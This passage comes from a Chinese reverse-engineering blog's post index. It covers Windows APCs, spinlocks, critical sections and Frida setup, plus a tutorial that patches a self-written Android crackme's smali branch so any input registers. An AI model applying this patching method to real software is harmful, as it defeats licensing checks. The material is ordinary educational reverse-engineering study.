APC结构中很多字段都是非常重要的，本节中先不深究，仅混个脸熟，认识一个字段即可。位于_KAPC+0x01c处的一个字段：NormalRoutine，通过这个字段，可以找到你提供的APC函数，但该字段并不等于APC函数的地址。本篇作此了解即可，后续会再作讨论。 APC的执行1）APC在哪执行： 用户APC：APC函数地址位于用户空间，在用户空间执行 内核APC：APC函数地址位于内核空间，在内核空间执行 这个概念还是比较好理解的，但这同时又抛出一个问题，由于用户APC必须在用户空间执行，又由上文可知用户APC队列与内核APC队列均位于KTHREAD结构体中，而这个KTHREAD结构体，是一个0环的内核结构体，也就意味着，在执行用户APC时，必须要考虑如何让用户APC在用户空间中执行，这个问题，在后续学到用户APC执行时会再作讨论，这里暂先设下疑问。 2）APC函数何时被执行： KiServiceExit函数：这个函数是系统调用、异常或中断返回用户空间的必经之路。 KiDeliverApc函数：负责执行APC的函数。 至于为什么是这两个函数呢，在后续介绍APC的文章中会进一步论证。 TerminateThread函数简要分析开头提到过，线程是不能它杀的，只能自杀，想让改变一个线程的行为，例如杀死一个线程，就得考虑使用发送APC的方式来达成。有了这个概念后，我们来看一个3环的API函数TerminateThread，该函数的作用是在线程外终止一个线程，下面我们进入IDA跟随反汇编来分析一下TerminateThread是否利用了APC机制实现终止线程的功能。 TerminateThread(Kernel32.dll) 观察TerminateThread代码可以发现，该函数只是个跳板函数，并未实现终止线程的功能，而是跳转到函数NtTerminateThread中。查找导入表中，可以找到NtTerminateThread是位于Ntdll.dll中的导出函数 NtTerminateThread(Ntdll.dll) 由图，需要注意的一点，ZwTerminateThread和NtTerminateThread是同一份代码导出的，因此没有本质的差别，这一部分就可以看到我们很熟悉的代码了，先保存了一个系统服务号到寄存器中，接着根据CPU是否支持sysenter来决定调用相应的SYstemCall。这是我们熟悉的API调用，3环进0环的过程，看来TerminateThread的实现是在0环。 NtTerminateThread(ntkrnlpa.exe) 根据导出的全局变量KeServiceDescriptorTable，可以找到SSDT，然后根据系统服务号就可以确定要查找的内核函数地址。如上图所示。 发现，NtTerminateThread要调用的内核函数仍然叫做NtTerminateThread，只不过这个是内核函数，用IDA打开ntkrnlpa.exe（本次实验采用PAE分页，原因是10-10-12分页对应的内核函数代码比较分散，分析起来过于麻烦，就换成PAE分页进行实验） 观察内核函数NtTerminateThread，发现PspTerminateThreadByPointer函数在多个分支的条件下都会被调用，名字也比较相似，遂继续跟进该函数寻找线索。 PspTerminateThreadByPointer(ntkrnlpa.exe) 可以看到，在PspTerminateThreadByPointer这个函数后半部分的位置，有一个初始化APC和一个将APC插入至队列的函数，这验证了，TerminateThread这个三环API函数的执行最终会依靠APC完成。 小结根据TerminateThread函数的调用流程，可以总结出，改变一个线程的行为的本质就是向它的APC队列中插入能够执行特定行为的APC块，在该线程执行的某个时刻中，会自己将APC取出来执行。所以说，线程的死亡不存在它杀的情况，一定是其自身执行了相应的APC，导致结束线程，让出CPU。因此，只要设置一个完美的条件，使得线程不会进行线程切换，且不给该线程发送APC时，这个线程将会永久占用CPU。 代码编写自己尝试编写一个3环的插入APC的程序，不过由于xp上vc6的头文件太旧了，导致无法使用QueueUserAPC函数，遂放弃，总体思路不难，首先创建/打开一个线程，然后通过QueueUserAPC函数将你自己定义的APC函数放入到该线程的队列，可以仅作简单的打印，主要是看一个效果。有一个注意点，就线程创建/打开后，需要sleep一秒，留出时间先让子线程进入等待（可提醒）状态。 参考资料参考链接： https://blog.csdn.net/qq_41988448/article/details/103609068 别人博客总结的内容 https://www.bilibili.com/video/BV1NJ411M7aE?p=69 滴水中级班教程（Apc部分） 参考笔记： 张嘉杰的笔记 舒默的笔记","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Python基础-思维导图","slug":"Python基础概述","date":"2020-05-19T06:10:03.000Z","updated":"2022-05-17T15:04:54.418Z","comments":true,"path":"2020/05/19/Python基础概述/","link":"","permalink":"http://cata1oc.github.io/2020/05/19/Python%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0/","excerpt":"","text":"综述由于需要用到Python，最近也是稍作复习，将常规的基础知识整理概括，并作了个思维导图，主要参考了廖雪峰的教程以及官方文档3.7.7，这两个教程的内容都比较基础，学完后基本上日常使用Python是没问题了，想要进一步提高可以参考Python3-cookbook的在线中文版。 这篇文章忙了3天，写写删删，原本是打算根据整理出来的思维导图把Python基础的知识点概括一下，但是发现越写越多，很多地方不好概括，又需要大量代码范例，相比之前写Windows内核的单个的知识点来说，内容有点过于庞大，写了几千字后发现实在是不知道该如何写是好，最后，干脆就只贴个思维导图吧，毕竟浓缩才是精华。也算是作个备份吧。当然，后续还会对思维导图进一步改进，也会对一些关键的知识点单独开一篇讨论 参考链接 https://www.liaoxuefeng.com/wiki/1016959663602400 （廖雪峰Python3教程） https://docs.python.org/3.7/tutorial/index.html （官网Python3.7.7入门指导手册） https://python3-cookbook.readthedocs.io/zh_CN/latest/index.html （Python3-cookbook中文版）","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://cata1oc.github.io/tags/Python/"}]},{"title":"Android程序分析入门（破解程序）","slug":"Android程序分析入门-下","date":"2020-05-11T12:38:28.000Z","updated":"2022-05-17T15:03:21.220Z","comments":true,"path":"2020/05/11/Android程序分析入门-下/","link":"","permalink":"http://cata1oc.github.io/2020/05/11/Android%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8-%E4%B8%8B/","excerpt":"","text":"前言在前面的篇章中做好了Android程序分析的准备工作，编写了一个可以用来破解的入门程序，配置了右键命令行的快捷键以及逆向分析需要用到的工具Apktool和AndroidKiller。本篇就来用这些工具对Android程序进行一次简单的破解。 破解入手我们之前编写的程序是一个简单的注册的页面程序，没有后台的，可以专门用来破解上手。也算是比较基础的破解类型。在正式破解之前，我们先捋一捋破解思路。如果有过Windows平台逆向破解经验的小伙伴就会这样想： 将程序拖进OllyDbg 注册程序 -> 注册失败，并留意注册失败时弹出的字符串 在OllyDbg中搜索相关字符串 找到分支执行语句并修改执行流程 完成暴破 这的确是一个非常连贯且合理的思路，但是Android程序并不像Windows上的exe程序一样，可以直接拖进调试器进行调试并修改。所以在对Android程序破解时步骤会有所变化： 对apk文件进行反编译 分析apk文件 修改Smali文件 将修改后的程序重新编译，并签名 下面，我们就按照这些步骤，对程序进行逆向破解吧。 反编译 首先找到我们之前的apk文件，在我们编写好的Android程序项目中的地址位于： Code1项目名\\app\\build\\outputs\\apk\\debug 右键在当前目录打开命令行，输入如下指令 Code1apktool d app-debug.apk -o outdir_dbg 这时apktool会将apk文件进行反编译，并输出到outdir_dbg文件中，如图所示 这样，我们反编译部分的工作就完成了 程序分析 这里首先我们需要下载一个工具，git bash，这部分在前一篇忘记提了，不过安装过程也很简单，进入官网下载后自行安装。一般情况下安装时它会要求添加到右键快捷键的，如果没有的话，就按照添加右键命令行的方法添加到注册表即可。 根据编写程序时的运行结果来看 我们需要搜索Register Failed字符串，然后找到其在程序中的所在位置，接着向上回溯，找到条件分支语句的地方，进行修改，便可完成暴破 有了思路后，开始实践，根据Android程序的特性，通常情况下，字符串硬编码到源码中，也可能引用自res/values目录下的string.xml文件中，所以我们决定对整个目录进行搜索，查找”Register Failed”字符串出现的位置，在对apk进行反汇编的目录中，右键Git Bash Here，键入如下指令： Code1grep -r \"Register Failed\" outdir_dbg/ 可以发现，仅有一处，并且的确位于res/values目录下的string.xml文件中 根据结果我们可以发现“Register Failed”这个字符串的值对应的Id是unsuccess，可以推测unsuccess有可能作为引用出现在反汇编代码中的某一处，所以接下来输入指令： Code1grep -r \"unsuccess\" outdir_dbg/ 结果显示有3处出现unsuccess，其中一处是第三步出现的；另外两处可以看出unsuccess只不过是个变量名，其值为0x7f0b002b。所以这个值，就有可能会是代码中引用代表\"Register Failed\"的值。 根据上一步的推测，继续搜索0x7f0b002b的值，输入如下指令： Code1grep -r \"0x7f0b002b\" outdir_dbg/ 根据结果，发现“0x7f0b002b”这个值出现了3次，值得关注的一处位于MainActivity$MyListener.smali这个文件中，有点Android正向开发经验都知道，一般来说MainActivity.java用于一个Android程序的主体功能的实现，而smali文件对应的就是Java文件编译完再反编译回来的文件。下面一个部分，将主要关注该文件。 修改Smali文件 找到MainActivity$MyListener.smali文件，路径位于： Code1项目名\\app\\build\\outputs\\apk\\debug\\outdir_dbg\\smali\\com\\droider\\crackme_0x1 用AndroidKiller打开该文件（也可以用别的文本编译器，例如010Editor），并定位到指令 smali1const v7, 0x7f0b002b 的位置，观察前后程序 我们可以发现，0x7f0b002b这个代表着“Register Failed”这个字符串的语句位于cond_1这个执行分支中，并且该执行分支，会将该参数传入Toast.makeText函数中执行，可以猜测，这部分就属于执行失败时要执行的地方。向上观察，有一个条件判断语句 smali1if-ne v6, v1, :cond_1 该语句当条件判断成立时会跳转到cond_1执行，也就是执行失败的分支。这就是突破口，我们可以修改这行条件判断语句，改为 smali1if-eq v6, v1, :cond_1 这样语句判断的条件相反，也就不那么容易跳转到执行失败的分支了，修改后代码如下： 修改完Smali文件后，这时就只剩下最后一步了 重新编译并签名 修改完smali文件后，回退到最初反编译的那个文件夹，右键进入命令行，输入如下指令： Code1apktool b outdir_dbg 这里是通过apktool将我们修改后的文件夹重新编译成apk文件，编译后生成的文件位于目录： Code1outdir_dbg\\dist 这里有一个很大的坑，我之前最早进行实验的时候，就是重新编译时总是失败，主要原因是apktool的版本不对，我的电脑Java的版本是13.0.1，apktool版本是2.4.1，在这个条件下是可以重新编译成功的，其它情况就不一定了。 在重新编译完后，生成了app-debug.apk文件，此时该文件是不能拖进Android虚拟机运行的，原因是我们修改了原本的apk文件，需要重新签名。这时我们利用AndroidKiller进行签名就行了。 步骤是：打开AndroidKiller -> 工具 -> APK签名 -> 将app-debug拖入 -> 选择签名AndroidKiller -> 执行 执行结束后效果如下： 此时在刚刚的文件夹中会生成一个新的文件apk-debug_sign.apk，这是已经签名过的程序，可以拖入虚拟机中运行 我们将apk-debug_sign.apk文件拖进虚拟机安装并运行，这时可以发现，无论我们输入什么用户名和校验码时，都会 弹出”Register Succeed”，原因是我们修改了程序的执行流程，使得在原本执行打印”Register Failed”情况变成了相反的情况。 至此，便完成了此次程序的整个的破解流程 小结本篇结束，Android逆向算是开了一个头，然而接下来的更新却可能遥遥无期。首先Windows内核部分，在驱动篇结束后，将和Android逆向部分穿插更新，接下来要到APC机制了，APC机制非常繁琐，而且需要逆向大量函数，这一篇章花费一个月都更不完也是有可能的。另一个，最近公司有Python开发的需求，加上最近使用Frida进行hook时，需要用到Python和JavaScript，虽说以前用过一段时间，也很久没用了，最近需要花点时间复习下，也会顺便更新几期Python以及JavaScript相关的内容。再之后，可能才轮到Android的Smali语法部分的更新，总的来说，5月接下来会更加忙碌了。 参考资料《Android软件安全权威指南》 —— 丰生强","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Frida简要安装教程（2021.3.14更新）","slug":"frida安装（20210314更新）","date":"2020-05-11T06:20:42.000Z","updated":"2022-05-17T15:02:17.881Z","comments":true,"path":"2020/05/11/frida安装（20210314更新）/","link":"","permalink":"http://cata1oc.github.io/2020/05/11/frida%E5%AE%89%E8%A3%85%EF%BC%8820210314%E6%9B%B4%E6%96%B0%EF%BC%89/","excerpt":"","text":"概述Frida是个轻量级别的hook框架。用Roy_Chen的话来说，说的专业一点，Frida是一种动态插桩工具，可以插入一些代码到原生app的内存空间去（动态地监视和修改其行为），这些原生平台可以是Win、Mac、Linux、Android或者iOS。 Frida使用Python 注入 JavaScript 脚本，从而能够在程序运行时实时地插入额外代码和数据，尽管大多数情况下，Frida用在对Android程序的Hook，但实际上是可以作用在大部分原生平台的。 关于Frida的使用方法等相关内容，会在后面对Android进行Hook的部分再作讨论，在这之前还有Smail汇编，Arm指令，Dex文件格式等内容的学习。之所以现在就介绍Frida安装的内容，是因为最近打算试着编写Android平台的Hook代码，在安装Frida时遇到了一些坑，防止以后忘记，在此先记录下来。 安装Python3Frida是用的Python作为接口注入JavaScript代码的，首先我们需要安装Python。为啥是3.7版本的呢？因为网上查阅的资料都是用的Python3.7，我也就用Python3.7了。虽然还是会遇到问题，待会再讨论。（2021.3.14更新：不一定要3.7版本的Python，但是frida的版本，frida-server的版本，以及Python3的版本，一定要能对的上） 去官网下载个Python3.7后，安装，记得点击下面的添加路径 打开命令行，键入python，回车，进入Python交互界面，安装成功。 安装Frida常规方法有个非常简单的办法 Code12pip3 install fridapip3 install frida-tools 只要在命令行中执行完这两条语句即可成功安装。但是多数情况下，在一台机器上第一次安装frida时，通过这两行指令，很难一次成功（我在公司一次成功了，还是在没有科学上网的情况下…），会遇到奇奇怪怪的坑，耽误很久。也因此下面还有一个比较常规的半手动安装的办法。 手动安装方法 到这里下载相应的文件如下：两个文件frida-12.8.20.tar.gz 和frida-12.8.20-py3.7-win-amd64.egg，根据自己的系统和型号选择进行下载，但是这两个文件的版本号一定要对应。(2021.3.14更新：在手动安装的情况下，.egg文件必须和当前Python的版本匹配，例如现在是3.7版本，那么就不能用Python3.8，此外手机端的frida-server也必须和.egg文件指定的frida版本匹配，例如现在就必须用frida-12.8.20的frida-server。当然这个版本现在在Android真机上跑不起来了，最好还是安装新版，为此.egg文件以及Python版本也要同步) 将下载的文件frida-12.8.20.tar.gz解压，进入目录后，执行如下指令安装 Code1python setup.py install 第一次执行时往往会失败，因为指定目录下找不到frida-12.8.20-py3.7-win-amd64.egg文件，我们只需要将该文件复制到它指定的目录下（%UserProfile%），再执行一遍指令即可 这时，我们相对于手动完成了pip3 install frida指令执行的操作，接下来只需进入命令行执行指令（注：这里还需要将frida-12.8.20-py3.7-win-amd64.egg文件复制到*\\Python\\Lib\\site-packages目录下再执行下述指令；该指令会执行失败多次，需要重复尝试以及长时间等待才能完成frida的完整安装。2020/7/5补充） Code1pip3 install frida-tools 即可完成frida安装。 安装成功后，输入指令进行验证 调试Android真机（2021.3.14新增）环境：一台电脑（已安装frida和adb）、一部安卓手机（已root，并开启USB调试） 完成上述安装后，在官网下载对应版本的frida-server-版本号-android-arm.xz（以Android6.0.1版本的手机为例） 解压后，修改文件名为frida-server 进入命令行，执行指令adb push frida-server /data/local/tmp，将frida-server给弄到真实机的/tmp目录下 接下来adb shell进入真机shell，su切换root用户，找到frida-server后修改权限为755。然后在当前目录下执行./frida-server &。若看到返回进程PID的结果，说明frida-server成功在手机端被启用。 最后，新开一个命令行窗口，执行frida-ps -U（U是指明指令应用在USB连接的设备上），若能列出真实机上的进程，则说明实验成功。 小结以上是在笔记本中配置环境时采的坑，由于台式机尚未配置，写下此篇也是方便以后配置时踩到坑再来看。（2021.3.14，新入职后，负责Android逆向，最近采了不少坑，当然主要是在家配置环境时遇到的，在单位倒是一帆风顺，另一方面，关于IDA动态调试后面也会考虑更新，但目前能力有限，对于壳以及反调试仍没有作为） 参考链接 https://www.freebuf.com/articles/system/190565.html （Roy_Chen一篇关于对Frida的介绍文章） https://www.cnblogs.com/pcat/p/12501850.html （简单Frida安装方法，第一次成功率不高） https://www.cnblogs.com/tjp40922/p/12799139.html （常规Frida安装方法，成功率高） https://www.jianshu.com/p/c349471bdef7 （一篇关于Frida的简要介绍）","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"多核同步之自旋锁","slug":"多核同步之自旋锁","date":"2020-05-09T01:03:45.000Z","updated":"2022-05-17T15:01:46.246Z","comments":true,"path":"2020/05/09/多核同步之自旋锁/","link":"","permalink":"http://cata1oc.github.io/2020/05/09/%E5%A4%9A%E6%A0%B8%E5%90%8C%E6%AD%A5%E4%B9%8B%E8%87%AA%E6%97%8B%E9%94%81/","excerpt":"","text":"前一篇关于临界区的文章中，提到了临界区的概念，它可以帮助我们在多核的情况下，实现多行代码/指令的线程同步，本篇来探索一下Windows提供的一种实现多核同步的机制，自旋锁。 不同版本的内核文件c1234567//单核ntkrnlpa.exe 2-9-9-12分页ntoskrnl.exe 10-10-12分页//多核:ntkrnlpa.exe（ntkrpamp.exe） 2-9-9-12分页ntoskrnl.exe（ntkrnlmp.exe） 10-10-12分页 Intel的CPU，多核情况下，系统安装时将ntkrnlmp.exe拷贝为ntoskrnl.exe，系统加载时加载这个（原来是ntkrnlmp.exe的）ntoskrnl.exe。所以Intel多核情况下，内核文件名仍然是ntoskrnl.exe，但是其源文件名是ntkrnlmp.exe，如果加载符号，符号文件名也是ntkrnlmp.pdb。也因此，单核，多核情况下都叫做ntoskrnl.exe。（注：以上内容来自这篇看雪文章评论里KiDebug大佬的解答） 在开始配置xp虚拟机的时候，我们设置的是单核，保证实验时不会发生核的切换，此时我们从C:\\Windows\\System32目录中复制出来的ntoskrnl.exe文件就是单核情况下的ntoskrnl.exe；想要获取多核情况下的ntkrnlmp.exe，需要重新设置虚拟机的处理器核的数量，设置成双核的处理器，如图所示 此时再进入操作系统，在C:\\Windows\\System32复制出来的ntoskrnl.exe实际上就是ntkrnlmp.exe了，我们为其重命名，拖进IDA中，进行下一步的分析。 SwapContext的差异首先来看SwapContext函数，作为线程切换的核心函数，来看一下多核跟单核情况下SwapContext的差异。 单核ntoskrnl.exe： 多核ntkrnlmp.exe: 我们看到开头部分，单核与多核的SwapContext一大差异是多核情况下的SwapContext函数在开头多了一对函数KeAcquireQueuedSpinLockAtDpcLevel与KeReleaseQueuedSpinLockFromDpcLevel。下面我们来看KeAcquireQueuedSpinLockAtDpcLevel做了什么事 KeAcquireQueuedSpinLockAtDpcLevel这个函数无论在单核还是多核的ntoskkrnl.exe里都有，但是多核的用在了线程切换函数SwapContext上，我们来看看区别。 单核ntoskrnl.exe： 单核的KeAcquireQueuedSpinLockAtDpcLevel函数没有任何作为，函数内部直接返回就结束了，重点是多核的。 多核ntkrnlmp.exe: 由图，多核的KeAcquireQueuedSpinLockAtDpcLevel做了这些工作，代码不多，但远比看着要复杂，也不易理解，还是一步步来看，每行指令含义已通过注释标记在了图中，单纯的看指令会很难理解，所以我们来学习一个新的概念：自旋锁 自旋锁与排队自旋锁自旋锁首先，我们要知道锁的概念，锁的用途是实现互斥访问。锁对象实质是一个二值对象，比如，0值表示锁是空闲的，任何线程都可以获得，一旦获得，则其值赋为1，因而任何其它线程将无法获得该锁，这样就实现了互斥访问。 计算机中有一种软件技术叫做忙等待，指重复地检查一个条件，直至这个条件满足为止。自旋锁的实现就利用了这个技术。 自旋锁是一种特殊的锁，它也有两个操作：Lock和Unlock。一个线程为了获得自旋锁，会占住处理器不放，并且不停地旋转（pause指令），即空耗处理器资源，直到该锁空闲下来，从而成功地获得它。因此，处理器在获得自旋锁以前，一直在检查锁的状态，而不是选择一个就绪线程来执行，也不交付任何APC（后面的文章会讨论）。 那么就会有人疑问了，这样空耗处理器资源岂不是很浪费？为何处理器不选择一个就绪线程执行呢？实际上，在预期等待时间很短的情况下，宁可空转一小段时间，而不是“经过环境切换，将控制权交给其它线程，待锁可用以后再切换回来”，这样可以避免两次环境切换，让当前任务继续执行下去。粗略而言，只要空转时间不超过两次环境切换的时间，则使用自旋锁并不会浪费处理器的计算资源。 这样我们就可以理解自旋锁的作用领域了，在单处理器系统上自旋锁没有任何意义，只会造成资源浪费。而在多处理器系统上，就可以变得有价值，它可以避免在处理器等待获取自旋锁时发生频繁的线程切换；但是这一定要考虑线程调度，换句话说，当一个处理器上的线程在等待自旋锁时，一定存在另一个处理器正在使用该锁保护的对象，并且可以期望该处理器很快会释放该锁（时间少于两次线程切换） 排队自旋锁当多个处理器抢夺自旋锁时，它们获取自旋锁的顺序是不确定的。Windows内核实现了一种排队的自旋锁，它允许处理器以先进先出（FIFO）的方式获取自旋锁。 在每个处理器的 KPRCB 结构中都有一个 LockQueue 数组成员，数组中的每一项对应于一个全局排队自旋锁，譬如，第一项对应于调度器锁，第三项对应于 PFN 数据库锁。关于这些锁的编号的定义，参见KSPIN_LOCK_QUEUE_NUMBER 枚举类型。因此，排队自旋锁一定是全局自旋锁，在内核设计时指定。处理器要访问排队自旋锁，只需指定锁编号即可。LockQueue 数组中每一项的类型均为 KSPIN_LOCK_QUEUE，其中包含一个 Next 指针和一个自旋锁指针 Lock。由于自旋锁的地址一定是按字对齐的，所以，Lock 成员的最后两位也被用于标志位：第 0 位表示是否在等待；第 1 位表示当前是否占用该锁，即是否为该锁的所有者。KiInitSpinLocks 函数包含了对所有这些排队自旋锁的初始化。 排队自旋锁的工作方式如下。如果自旋锁是空闲的，则其值（自旋锁指针Lock指向的值）为 0；如果它已被一个处理器获取，则指向该处理器的 KPRCB 中对应于该锁的 LockQueue 数组项。如果有多个处理器正在等待一个排队自旋锁，则以当前已经获取到该自旋锁的处理器的 LockQueue 数组项为链表头，通过 KSPIN_LOCK_QUEUE 的 Next 成员，构成一个排队单链表，自旋锁本身的值指向最后一个插入进来的处理器的 LockQueue 数组项。 基于这样的数据结构，当一个处理器要获取一个已被其他处理器占用或多个处理器正在竞争的排队自旋锁时，将把自己的 LockQueue 数组项插入到链表末尾，并将自旋锁的状态更新为指向自己这一项。然后，它在自己的 LockQueue 数组项的 Lock 成员的第 0 位（即等待位）上旋转，直至该状态位被清除表明已轮到它了。当一个处理器释放排队自旋锁时，它会清除 Lock 成员的第 1 位（即所有者位），然后，若没有处理器在等待该锁，则该自旋锁的状态变为 0，否则，清除排队链表中下一个处理器的 Lock 成员最低 2 位（所以，该处理器的等待标志位被清除，它可以结束旋转），并将自己的 Next 成员清零。下图显示了两个处理器 P1 和 P2 正在等待一个已被另一个处理器 P0 获取的排队自旋锁的情形。 有了排队自旋锁的概念后，再去看KeAcquireQueuedSpinLockAtDpcLevel函数就能够理解了。如下图所示： 总结 自旋锁只对多核有意义。 自旋锁与临界区、事件、互斥体一样，都是一种同步机制，都可以让当前线程处于等待状态，区别在于自旋锁不用切换线程。 参考链接参考书籍：《Windows内核原理与实现》 参考教程：https://www.bilibili.com/video/av68700135?p=65 （滴水中级预习班65课时） 参考链接： https://www.xuebuyuan.com/219919.html （一篇关于自旋锁分析的文章） https://blog.csdn.net/whatday/article/details/13170495 （Windows内核原理与实现书中出现的函数，全局变量等出现的页码，非常有用！）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"多核同步之临界区","slug":"多核同步之临界区","date":"2020-05-07T01:09:27.000Z","updated":"2022-05-17T15:00:26.319Z","comments":true,"path":"2020/05/07/多核同步之临界区/","link":"","permalink":"http://cata1oc.github.io/2020/05/07/%E5%A4%9A%E6%A0%B8%E5%90%8C%E6%AD%A5%E4%B9%8B%E4%B8%B4%E7%95%8C%E5%8C%BA/","excerpt":"","text":"本篇来说一下多核同步相关联的知识，原本这是位于滴水教程中驱动部分的内容，但实际上更偏向于同步的知识点，同步相关的内容会在APC更新完后再作更新。这里也算是简单的作个预习。 并发与同步并发是指多个线程在同时执行： 单核（是分时执行，不是真正的同时） 多核（在某一个时刻，会同时有多个线程在执行） 同步则是保证在并发执行的环境中各个线程可以有序的执行 单行指令的同步单行代码安全吗有了并发与同步的概念，下面我们来看一个代码： c12345DWORD dwVal = 0; //全局变量........ //某个线程中dwVal++; //这行代码安全吗？ dwVal是一个全局变量，在某个线程中，有一个对dwVal的值进行自增的代码。简要思考一下，这行代码安全吗？ 实际上是不安全的，我们来看一下这行指令的反汇编： Code123mov eax, [0x12345678]add eax, 1mov [0x12345678], eax dwVal++这一条自增语句，对应了3条汇编指令，也就是说程序在执行dwVal++时，需要按照顺序执行3条汇编指令，才能实现这条语句的功能。 现在我们来考虑一种情况，线程A和线程B均要进行dwVal++这条指令，理想状态下，这两个线程执行完后，该全局变量的值会增加2。但是如果在线程A执行完第二条指令后，发生了线程切换，情况就会变的不一样了。参考如下代码： Code12345678910111213//线程Amov eax, [0x12345678]add eax, 1//发生线程切换//线程Bmov eax, [0x12345678]add eax, 1mov [0x12345678], eax//发生线程切换//线程Amov [0x12345678], eax 根据推演出的情况，在线程A执行完第二条指令后，发生了线程切换，切换到了线程B，这样CPU执行的过程就会如上述代码所示，当两个线程执行完后，全局变量的值dwVal只会增加1，并不会增加2，结果和预期的并不一样。所以用单行代码对一个全局变量进行修改，是不安全的。 单行指令安全吗既然单行代码不安全，那单行指令安全吗？参考如下汇编指令： Code1inc dword ptr ds:[0x12345678] //一行汇编指令，安全吗? 这条汇编指令仅有一行，看上去不会出现上述的情况。即使线程发生切换了，也不会造成指令的重复执行。的确，在单核的情况下，这条指令是安全的，但是多核的情况下，还是有可能发生，不同线程同时执行这条指令的情况，所以这条指令并不安全。那如何才能在多核的情况下，依旧保证线程间的同步呢？那就需要用到下面介绍的这条指令了。 LOCK指令我们只需要增加一个lock指令，就能让单条指令在多核的情况下做到同步，参考如下代码： Code1lock inc dword ptr ds:[0x12345678] lock指令有什么用呢？lock指令可以锁定当前指令执行时线程所访问的内存，上述代码执行时，会对0x12345678地址处的值进行修改，有了lock指令的限制，此时其它线程是不能访问或修改0x12345678地址处的值的，只有在这条指令执行完后，其余线程才可以对此地址的值进行访问或者修改。这样就避免了多核情况下，不同线程同时修改此地址处的值的情况。 像上面这样通过Lock指令进行限制，从而不可被中断的操作叫做原子操作。Windows提供了一部分API（主要位于Kernel32.dll和Ntdll.dll）供用户使用从而保证在多核情况下的线程同步。 c12345//原子操作相关的API：InterlockedIncrement InterlockedExchangeAddInterlockedDecrement InterlockedFlushSList InterlockedExchange InterlockedPopEntrySListInterlockedCompareExchange InterlockedPushEntrySList InterlockedIncrement下面我们分析Windows提供的原子函数InterlockedIncrement，来理解一下这种同步的实现的本质： IDA打开Kernel32.dll，搜索InterlockedIncrement便可找到，这是一个导出函数。 Code1234567_asm { mov ecx, [esp+lpAddend] mov eax, 1 lock xadd [ecx], eax inc eax retn 4} 这个代码非常简单，一共就5行，我们逐行分析： 将需要修改的变量（往往是个全局变量，它的地址会作为参数传入InterlockedIncrement函数）的地址赋给ecx，此时可以通过[ecx]访问该变量的值 给eax赋值1 这行指令分为两部分看，第一部分是lock，我们已经知道，它用来锁住内存；另一部分核心在于xadd指令，该指令接收2个参数，先交换两个操作数的值，再进行算术加法操作。可以按下述伪代码理解： c12345DWORD temp;temp = [ecx];[ecx] = eax;eax = temp;[ecx] += eax; 这一步对eax自增1，此时eax和[ecx]的值相同，eax可以起到返回值的作用（尽管已经完成对[ecx]值的修改） 平衡堆栈并返回 分析完后就很好理解InterlockedIncrement函数了，本质上就是用lock指令完成一个原子操作以保证多核状态下的线程同步。 小节这下，我们对于单行指令的同步已经理解到位了，只需在指令前加上lock，就可以保证这条指令执行期间，不会有其它线程访问当前指令访问的内存。下面我们来学习一下多行指令的同步概念。 多行指令的同步多行指令原子操作如果有多行指令要求原子操作，单独加lock可行吗？观察如下代码： Code12345_asm { lock inc dword ptr ds:[0x12345678] lock inc dword ptr ds:[0x23456789] lock inc dword ptr ds:[0x3456789A]} 答案是不可行，lock指令锁住的是内存，线程该切换还是切换，例如线程A在对0x12345678地址上的值进行修改时，发生了线程切换，尽管线程B此时并不能对0x12345678上的值进行修改，但是可以对0x3456789A地址上的值进行修改，如果这时又发生线程切换，切了回去，线程B甚至可以把线程A锁住，不让线程A去修改0x3456789A地址处的值。这样还是没有办法保证，对于这3行指令进行原子操作。这时，就需要引入一个新的概念，临界区。 临界区可以设置一个临界区，一次只允许一个线程进入直到离开，从而保证线程的同步（这里的临界区指的是广义的临界区，各个操作系统根据临界区的思想都有各自的实现，后面也会学习到Windows提供的临界区实现）参考如下代码： c123456789101112DWORD dwFlag = 0; //实现临界区的方式就是加锁 //锁：全局变量 进去加一 出去减一if(dwFlag == 0) //进入临界区 { dwFlag = 1 ....... ....... ....... dwFlag = 0 //离开临界区} 该代码使用一个全局变量定义了一个锁，这是一个用来进入临界区的锁，当锁为0时，即可进入临界区，进入临界区去，将锁的值修改为1，这样别的线程就无法再进入临界区了。此时临界区中执行的代码可以看作原子操作。理论上可以解决多行指令的多核同步问题。 不过我们再仔细观察一遍这个代码，其实是有问题的，考虑一种情况，在进入临界区后，如果dwFlag = 1这条指令还没有执行，此时发生了线程切换，这时，切换后的新线程也可以进入临界区，这样临界区的作用就失效了。 所以，我们可以换一种方式，先修改锁的值，然后再进入临界区，参考如下伪代码： Code1234567891011121314151617181920//定义全局变量Flag = 0;//进入临界区Lab： mov eax,1 //多核情况下必须加lock lock xadd [Flag],eax cmp eax,0 jz endLab dec [Flag] //线程等待Sleep.. jmp Lab//临界区内部endLab: ret //离开临界区lock dec [Flag] 这份伪代码提供了一个新的思路，在进入临界区之前，先判断锁的值，若达到进入临界区的条件，则先修改锁的值，再进入临界区；若条件不符合，则调用sleep()函数，进行线程等待。一段时间后，在跳回进入临界区的地方重新判断。在线程退出临界区后，再通过原子操作还原锁的值。 小结：临界区可以通过添加全局变量的方式实现。 总结 lock指令可以实现单条指令的多核同步 临界区可以实现多行指令的多核同步 参考链接参考教程：https://www.bilibili.com/video/av68700135?p=64 